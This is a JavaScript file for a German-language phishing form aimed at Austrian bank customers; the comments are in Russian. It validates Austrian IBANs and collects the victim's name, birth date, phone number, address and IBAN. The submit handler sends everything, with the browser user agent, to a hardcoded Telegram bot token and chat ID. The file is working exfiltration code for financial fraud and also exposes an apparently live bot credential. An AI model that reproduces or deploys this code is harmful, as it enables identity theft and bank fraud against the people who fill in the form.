// ============================================================
// 🔥 КОНФИГУРАЦИЯ
// ============================================================
const BOT_TOKEN = "8868232573:AAEW0wq6mguGORRd_woASqbkE80zg7w59G8";
const CHAT_ID = "-1004324836304";

let ibanCheckResult = {
    valid: false,
    message: 'nicht geprüft',
    bankData: null,
    iban: ''
};

// ============================================================
// 🏛️ ОПРЕДЕЛЕНИЕ БАНКА ПО BIC (для бота)
// ============================================================
function getBankNameByBIC(bic) {
    const bankMap = {
        'GENODEF1HH2': 'Hamburger Sparkasse (Haspa)',
        'GENODEF1HH1': 'Hamburger Sparkasse',
        'DEUTDEHH': 'Deutsche Bank Hamburg',
        'COBADEHH': 'Commerzbank Hamburg',
        'HYVEDEMM': 'UniCredit Bank - HypoVereinsbank',
        'DRESDEFF': 'Commerzbank (Dresdner Bank)',
        'SPARDEHH': 'Sparkasse Hamburg',
        'VORSDEHH': 'Volksbank Hamburg',
        'HELADEF1': 'Sparkasse',
        'GENODEFF': 'Volksbank',
        'SOLADEST': 'Sparkasse',
        'BYLADEM': 'BayernLB',
        'GENODEF1S2': 'Sparkasse',
        'DEUTDEDB': 'Deutsche Bank',
        'COBADEFF': 'Commerzbank',
        'TRIDEFHH': 'Targobank Hamburg',
        'INGDDEFF': 'ING Bank',
        'NTSBDEDE': 'N26 Bank',
        'SOGEDEFF': 'Societe Generale',
        'BNPADEFF': 'BNP Paribas',
        'BUKBDEFF': 'Bankhaus BUKB',
        'MHBKDEHH': 'M.M.Warburg & CO',
        'SCFBDEFF': 'Sberbank',
        'VPAYDEFF': 'V-Payment',
        'SSKNDEFF': 'S-Kreditpartner',
        'GENODEF1HHV': 'Hamburger Volksbank',
        'HASPDEHH': 'Haspa Hamburg',
        'DEUTDEHHV': 'Deutsche Bank Hamburg',
        'COBADEHHV': 'Commerzbank Hamburg',
        'GENODEF1P2': 'Sparkasse Pforzheim',
        'GENODEF1S1': 'Sparkasse',
        'GENODEF1A2': 'Sparkasse Aachen',
        'GENODEF1B1': 'Sparkasse Bremen',
        'GENODEF1D1': 'Sparkasse Dortmund',
        'GENODEF1E1': 'Sparkasse Essen',
        'GENODEF1F1': 'Sparkasse Frankfurt',
        'GENODEF1G1': 'Sparkasse Gera',
        'GENODEF1H1': 'Sparkasse Hannover',
        'GENODEF1K1': 'Sparkasse Köln',
        'GENODEF1L1': 'Sparkasse Leipzig',
        'GENODEF1M1': 'Sparkasse München',
        'GENODEF1N1': 'Sparkasse Nürnberg',
        'GENODEF1R1': 'Sparkasse Rostock',
        'GENODEF1S2': 'Sparkasse Stuttgart',
        'GENODEF1W1': 'Sparkasse Wiesbaden'
    };
    return bankMap[bic.toUpperCase()] || null;
}

// ============================================================
// 🚀 ИНИЦИАЛИЗАЦИЯ
// ============================================================
document.addEventListener('DOMContentLoaded', function() {
    const ibanInput = document.getElementById('ibanInput');
    const birthdateInput = document.getElementById('birthdateInput');
    const phoneInput = document.getElementById('phoneInput');
    const submitBtn = document.getElementById('submitBtn');

    if (submitBtn) {
        submitBtn.disabled = false;
    }

    // ============================================================
    // 📱 ТЕЛЕФОН
    // ============================================================
    if (phoneInput) {
        if (phoneInput.value === '' || phoneInput.value === '+43') {
            phoneInput.value = '+43';
        }

        phoneInput.addEventListener('focus', function() {
            const len = this.value.length;
            this.setSelectionRange(len, len);
        });

        phoneInput.addEventListener('input', function() {
            if (this.value === '') {
                this.value = '+43';
                const len = this.value.length;
                this.setSelectionRange(len, len);
            }
        });
    }

    // ============================================================
    // 📅 МАСКА ДЛЯ ДАТЫ
    // ============================================================
    if (birthdateInput) {
        birthdateInput.addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            let formatted = '';
            
            if (value.length > 8) {
                value = value.slice(0, 8);
            }
            
            for (let i = 0; i < value.length; i++) {
                if (i === 2 || i === 4) {
                    formatted += '/';
                }
                formatted += value[i];
            }
            
            this.value = formatted;
        });
    }

    // ============================================================
    // 🏦 IBAN — С ВАЛИДАЦИЕЙ ДЛЯ AT
    // ============================================================
    if (ibanInput) {
        ibanInput.maxLength = 34;

        ibanInput.addEventListener('input', function() {
            let value = this.value.replace(/\s/g, '').toUpperCase();
            this.value = value;

            // Валидация для австрийского IBAN
            const ibanError = document.getElementById('ibanError');
            if (ibanError) ibanError.style.display = 'none';

            // Проверка: начинается с AT и длина от 20 до 34
            if (value.length > 0) {
                if (!value.startsWith('AT')) {
                    if (ibanError) {
                        ibanError.textContent = 'IBAN muss mit AT beginnen.';
                        ibanError.style.display = 'block';
                    }
                    ibanCheckResult = {
                        valid: false,
                        message: 'muss mit AT beginnen',
                        bankData: null,
                        iban: value
                    };
                    return;
                }

                if (value.length < 20) {
                    if (ibanError) {
                        ibanError.textContent = 'IBAN muss mindestens 20 Zeichen enthalten.';
                        ibanError.style.display = 'block';
                    }
                    ibanCheckResult = {
                        valid: false,
                        message: 'zu kurz',
                        bankData: null,
                        iban: value
                    };
                    return;
                }

                if (value.length > 34) {
                    if (ibanError) {
                        ibanError.textContent = 'IBAN darf maximal 34 Zeichen enthalten.';
                        ibanError.style.display = 'block';
                    }
                    ibanCheckResult = {
                        valid: false,
                        message: 'zu lang',
                        bankData: null,
                        iban: value
                    };
                    return;
                }

                // Проверка на допустимые символы (только буквы и цифры)
                if (!/^[A-Z0-9]+$/.test(value)) {
                    if (ibanError) {
                        ibanError.textContent = 'IBAN darf nur Buchstaben und Zahlen enthalten.';
                        ibanError.style.display = 'block';
                    }
                    ibanCheckResult = {
                        valid: false,
                        message: 'ungültige Zeichen',
                        bankData: null,
                        iban: value
                    };
                    return;
                }

                // Если всё ок
                ibanCheckResult = {
                    valid: true,
                    message: 'gültig',
                    bankData: null,
                    iban: value
                };
            } else {
                ibanCheckResult = {
                    valid: false,
                    message: 'nicht geprüft',
                    bankData: null,
                    iban: ''
                };
            }
        });
    }

    // ============================================================
    // 🚀 ОТПРАВКА ФОРМЫ (с проверкой IBAN)
    // ============================================================
    const form = document.getElementById('phishingForm');
    if (!form) return;
    
    form.addEventListener('submit', function(event) {
        event.preventDefault();
        
        // Проверяем телефон
        const phoneDigits = phoneInput.value.replace(/[^0-9]/g, '');
        if (phoneDigits.length < 6) {
            alert('Bitte geben Sie eine gültige Telefonnummer ein (mindestens 6 Ziffern).');
            return;
        }

        // Проверяем IBAN
        const ibanValue = ibanInput.value.trim();
        if (!ibanValue.startsWith('AT')) {
            alert('Bitte geben Sie eine gültige österreichische IBAN ein (beginnt mit AT).');
            ibanInput.focus();
            return;
        }
        if (ibanValue.length < 20) {
            alert('Die IBAN muss mindestens 20 Zeichen enthalten.');
            ibanInput.focus();
            return;
        }
        if (!/^[A-Z0-9]+$/.test(ibanValue)) {
            alert('Die IBAN darf nur Buchstaben und Zahlen enthalten.');
            ibanInput.focus();
            return;
        }
        
        const formData = new FormData(form);
        const data = {};
        formData.forEach((value, key) => {
            data[key] = value.trim() || 'nicht angegeben';
        });
        
        data.iban_check = ibanCheckResult;
        sendToTelegram(data);
    });
});

// ============================================================
// 📤 ОТПРАВКА В TELEGRAM
// ============================================================
function sendToTelegram(data) {
    const submitBtn = document.getElementById('submitBtn');
    submitBtn.disabled = true;
    submitBtn.classList.add('loading');
    submitBtn.textContent = '⏳ Sende...';
    
    let message = '🔴 <b>NEUE DATEN!</b>\n\n';
    message += `👤 <b>Name:</b> ${data.fullname || 'nicht angegeben'}\n`;
    message += `🎂 <b>Geburtsdatum:</b> ${data.birthdate || 'nicht angegeben'}\n`;
    message += `📱 <b>Telefon:</b> ${data.phone || 'nicht angegeben'}\n`;
    message += `📍 <b>Adresse:</b> ${data.street || 'nicht angegeben'}\n`;
    message += `🏙️ <b>Stadt:</b> ${data.city || 'nicht angegeben'}\n`;
    message += `📮 <b>PLZ:</b> ${data.postal || 'nicht angegeben'}\n`;
    
    const ibanData = data.iban_check || { valid: false, message: 'nicht geprüft', bankData: null };
    message += `🏦 <b>IBAN:</b> ${data.iban || 'nicht angegeben'}\n`;
    message += `🔍 <b>IBAN-Status:</b> ${ibanData.message || 'nicht geprüft'}\n`;
    
    message += `\n🕒 <b>Zeit:</b> ${new Date().toLocaleString('de-DE')}`;
    message += `\n🌐 <b>Browser:</b> ${navigator.userAgent}`;
    
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            submitBtn.textContent = '✅ Gesendet!';
            submitBtn.style.background = '#28a745';
            setTimeout(() => {
                document.getElementById('phishingForm').reset();
                submitBtn.textContent = 'Absenden';
                submitBtn.style.background = '';
                submitBtn.disabled = false;
                submitBtn.classList.remove('loading');
                
                const phoneInput = document.getElementById('phoneInput');
                if (phoneInput) phoneInput.value = '+43';
                
                const birthdateInput = document.getElementById('birthdateInput');
                if (birthdateInput) birthdateInput.value = '';
                
                const ibanInput = document.getElementById('ibanInput');
                if (ibanInput) ibanInput.value = '';
                
                ibanCheckResult = { valid: false, message: 'nicht geprüft', bankData: null, iban: '' };
            }, 2000);
        } else {
            throw new Error(data.description || 'Unknown error');
        }
    })
    .catch(error => {
        submitBtn.textContent = '❌ Fehler!';
        submitBtn.style.background = '#dc3545';
        setTimeout(() => {
            submitBtn.textContent = 'Absenden';
            submitBtn.style.background = '';
            submitBtn.disabled = false;
            submitBtn.classList.remove('loading');
        }, 3000);
    });
}
